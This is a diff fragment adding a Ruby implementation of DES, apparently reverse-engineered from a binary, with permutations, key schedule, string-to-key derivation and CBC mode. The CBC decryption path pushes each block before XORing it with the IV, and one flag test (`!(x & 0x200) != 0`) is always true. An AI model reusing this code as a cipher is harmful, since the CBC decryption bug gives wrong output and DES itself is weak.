+    if (v4 & 0x1000) != 0
+      v5 |= 0x4000000
+    end
+    if (v3 & 0x1000) != 0
+      v5 |= 0x8000000
+    end
+    if (v4 & 0x100000) != 0
+      v5 |= 0x10000000
+    end
+    if (v3 & 0x100000) != 0
+      v5 |= 0x20000000
+    end
+    if (v4 & 0x10000000) != 0
+      v5 |= 0x40000000
+    end
+    if (v3 & 0x10000000) != 0
+      v5 |= 0x80000000
+    end
+    if (v4 & 8) != 0
+      v6 = 1
+    end
+    if (v3 & 8) != 0
+      v6 |= 2
+    end
+    if (v4 & 0x800) != 0
+      v6 |= 4
+    end
+    if (v3 & 0x800) != 0
+      v6 |= 8
+    end
+    if (v4 & 0x80000) != 0
+      v6 |= 0x10
+    end
+    if (v3 & 0x80000) != 0
+      v6 |= 0x20
+    end
+    if (v4 & 0x8000000) != 0
+      v6 |= 0x40
+    end
+    if (v3 & 0x8000000) != 0
+      v6 |= 0x80
+    end
+    if (v4 & 4) != 0
+      v6 |= 0x100
+    end
+    if (v3 & 4) != 0
+      v6 |= 0x200
+    end
+    if (v4 & 0x400) != 0
+      v6 |= 0x400
+    end
+    if (v3 & 0x400) != 0
+      v6 |= 0x800
+    end
+    if (v4 & 0x40000) != 0
+      v6 |= 0x1000
+    end
+    if (v3 & 0x40000) != 0
+      v6 |= 0x2000
+    end
+    if (v4 & 0x4000000) != 0
+      v6 |= 0x4000
+    end
+    if (v3 & 0x4000000) != 0
+      v6 |= 0x8000
+    end
+    if (v4 & 2) != 0
+      v6 |= 0x10000
+    end
+    if (v3 & 2) != 0
+      v6 |= 0x20000
+    end
+    if (v4 & 0x200) != 0
+      v6 |= 0x40000
+    end
+    if (v3 & 0x200) != 0
+      v6 |= 0x80000
+    end
+    if (v4 & 0x20000) != 0
+      v6 |= 0x100000
+    end
+    if (v3 & 0x20000) != 0
+      v6 |= 0x200000
+    end
+    if (v4 & 0x2000000) != 0
+      v6 |= 0x400000
+    end
+    if (v3 & 0x2000000) != 0
+      v6 |= 0x800000
+    end
+    if (v4 & 1) != 0
+      v6 |= 0x1000000
+    end
+    if (v3 & 1) != 0
+      v6 |= 0x2000000
+    end
+    if (v4 & 0x100) != 0
+      v6 |= 0x4000000
+    end
+    if (v3 & 0x100) != 0
+      v6 |= 0x8000000
+    end
+    if (v4 & 0x10000) != 0
+      v6 |= 0x10000000
+    end
+    if (v3 & 0x10000) != 0
+      v6 |= 0x20000000
+    end
+    if (v4 & 0x1000000) != 0
+      v6 |= 0x40000000
+    end
+    if (v3 & 0x1000000) != 0
+      v6 |= 0x80000000
+    end
+
+    # Create return tuple
+    ret_block = Array.new
+    ret_block.push v5
+    ret_block.push v6
+    ret_block
+  end
+
+  def load(a1)
+    a2 = Array.new(8, 0)
+    v3 = a1
+    a2[0] = a1 & 0xff
+    v3 >>= 3
+    a2[1] = v3 & 0xff
+    v3 >>= 4
+    a2[2] = v3 & 0xff
+    v3 >>= 4
+    a2[3] = v3 & 0xff
+    v3 >>= 4
+    a2[4] = v3 & 0xff
+    v3 >>= 4
+    a2[5] = v3 & 0xff
+    v3 >>= 4
+    a2[6] = v3 & 0xff
+    v3 >>= 4
+    a2[7] = v3 & 0xff
+    a2[0] = (a2[0] * 2) & 0xff
+    a2[7] |= (16 * a2[0]) & 0xff
+    v3 >>= 4
+    a2[0] |= v3 & 0xff
+
+    data_block = a2.pack("c*").unpack("V*")
+    data_block[0] &= 0x3F3F3F3F
+    data_block[1] &= 0x3F3F3F3F
+    data_block
+  end
+
+  def desx(data_block, ksch, idx)
+    ksch = ksch.pack("V*")
+    ksch = ksch.unpack("Q<*")
+    key_block = ksch[idx]
+
+    data_block_ptr = data_block.pack("V*")
+    data_block_ptr = data_block_ptr.unpack1("Q<*")
+    data_block_ptr ^= key_block
+
+    counter = 1
+    data_block_byte_ptr = [data_block_ptr].pack('Q<')
+    left = SBOXES[data_block_byte_ptr[0].ord]
+    right = SBOXES[data_block_byte_ptr[0].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[1].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[1].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[2].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[2].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[3].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[3].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[4].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[4].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[5].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[5].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[6].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[6].ord + (counter << 6)]
+    counter += 1
+    left ^= SBOXES[data_block_byte_ptr[7].ord + (counter << 6)]
+    counter += 1
+    right ^= SBOXES[data_block_byte_ptr[7].ord + (counter << 6)]
+
+    # Create return tuple
+    ret_block = Array.new
+    ret_block.push left
+    ret_block.push right
+    ret_block
+
+  end
+
+  def store(data_block)
+    a1 = data_block.pack("V*")
+    val = 8 * (16 * (16 * (16 * (16 * (16 * (16 * a1[7].ord | a1[6].ord) | a1[5].ord) | a1[4].ord) | a1[3].ord) | a1[2].ord) | a1[1].ord) | a1[0].ord >> 1
+    val & 0xffffffff
+  end
+
+  def sbox_xors(data_block_in, ksch_arg, decrypt_flag)
+
+    decrypt_flag_cpy = decrypt_flag
+    if (decrypt_flag & 0x100) != 0
+      data_block_0 = data_block_in
+    else
+      data_block_0 = rotate_block_init(data_block_in)
+    end
+
+    encrypt_flag = (decrypt_flag_cpy & 1) == 0
+    ti_block_0 = load(data_block_0[0])
+    ti_block_1 = load(data_block_0[1])
+
+    for i in 0..15
+      ti_cpy = ti_block_1
+      if encrypt_flag
+        ti_block_1 = desx(ti_block_1, ksch_arg, i)
+      else
+        ti_block_1 = desx(ti_block_1, ksch_arg, 15 - i)
+      end
+      ti_block_1[0] ^= ti_block_0[0]
+      ti_block_1[1] ^= ti_block_0[1]
+      ti_block_0 = ti_cpy
+    end
+
+    data_block_0[0] = store(ti_block_1)
+    data_block_0[1] = store(ti_block_0)
+
+    if (!(decrypt_flag_cpy & 0x200) != 0)
+      rotate_block_final(data_block_0)
+    else
+      data_block_0
+    end
+
+  end
+
+  def gen_key_unchecked(key)
+
+    idx = 0
+    key_arr = key.unpack("V*")
+    key_sch = Array.new
+    for i in 0..15
+      idx += ROTATIONS[i].ord
+      v6 = 0
+      v5 = 0
+      v14 = 0
+      for j in 0..47
+        pc2_p1 = (idx + PC2[j].ord) % 0x1C
+        if PC2[j].ord > 0x1B
+          pc2_p2 = 0x1c
+        else
+          pc2_p2 = 0
+        end
+        v13 = PC1[pc2_p1 + pc2_p2].ord
+        if v13 <= 31
+          v12 = 0
+        else
+          v12 = 1
+          v13 -= 32
+        end
+        if j <= 23
+          v10 = j
+        else
+          v14 = 1
+          v10 = j - 24
+        end
+        v11 = 8 * (v10 / 6) + v10 % 6
+        key_and = key_arr[v12] & SBOX_BYTE_ORDER[v13]
+
+        if (key_and != 0)
+          if v14 == 1
+            v6 |= SBOX_BYTE_ORDER[v11]
+          else
+            v5 |= SBOX_BYTE_ORDER[v11]
+          end
+        end
+      end
+      key_sch.push v5
+      key_sch.push v6
+    end
+    key_sch
+  end
+
+  def des_string_to_key(key_buf_str)
+
+    des_keysch_0 = gen_key_unchecked(INIT_DES_KEY_0)
+    des_keysch_1 = gen_key_unchecked(INIT_DES_KEY_1)
+
+    temp_key1 = Array.new(8, 0)
+    temp_key2 = Array.new(8, 0)
+
+    key_buf_bytes = key_buf_str.unpack("c*")
+
+    counter = 0
+    key_buf_str_len = key_buf_bytes.length - 1
+    for i in 0..key_buf_str_len
+      counter %= 8
+      temp_key1[counter] |= key_buf_bytes[i]
+      temp_key2[counter] |= key_buf_bytes[i]
+
+      data_block = temp_key1.pack("c*").unpack("V*")
+      temp_key1 = sbox_xors(data_block, des_keysch_0, 0)
+      temp_key1 = temp_key1.pack("V*").unpack("c*")
+
+      data_block = temp_key2.pack("c*").unpack("V*")
+      temp_key2 = sbox_xors(data_block, des_keysch_1, 0)
+      temp_key2 = temp_key2.pack("V*").unpack("c*")
+      counter += 1
+    end
+
+    # Prepare the return array
+    ret_key = Array.new(8, 0)
+    for j in 0..7
+      ret_key[j] = temp_key2[j] ^ temp_key1[j]
+    end
+    ret_key.pack("c*")
+  end
+
+  def des_cbc(input_buf, key_sch, iv, decrypt_flag)
+
+    output_block_arr = Array.new
+    blocks = input_buf.unpack("Q<*")
+    for i in 0..blocks.length - 1
+
+      current_block = blocks[i]
+      if decrypt_flag == 1
+        cur_block = current_block
+      else
+        current_block ^= iv
+      end
+
+      current_block_tuple = [current_block].pack("Q<").unpack("V*")
+      output_block_tuple = sbox_xors(current_block_tuple, key_sch, decrypt_flag)
+      output_block = output_block_tuple.pack("V*").unpack1("Q<")
+      output_block_arr.push output_block
+
+      if decrypt_flag == 1
+        output_block ^= iv
+        iv = cur_block
+      else
+        iv = output_block
+      end
+    end
+
+    output_block_arr.pack("Q<*")
+
+  end
+
+  def des_crypt_func(binary_buf, key_buf, decrypt_flag)
+    des_key = des_string_to_key(key_buf)
+    des_keysch = gen_key_unchecked(des_key)
+
+    temp_enc_buf = Array.new(8 * ((binary_buf.length + 7) >> 3) + 8, 0)
+    binary_buf_str = binary_buf.unpack('c*')
+
+    for j in 0..binary_buf_str.length - 1
+      temp_enc_buf[j] = binary_buf_str[j]
+    end
+
+    temp_enc_buf = temp_enc_buf.pack('c*')
+    output_buf = des_cbc(temp_enc_buf, des_keysch, 0, decrypt_flag)
+    output_buf
+  end
+
+end
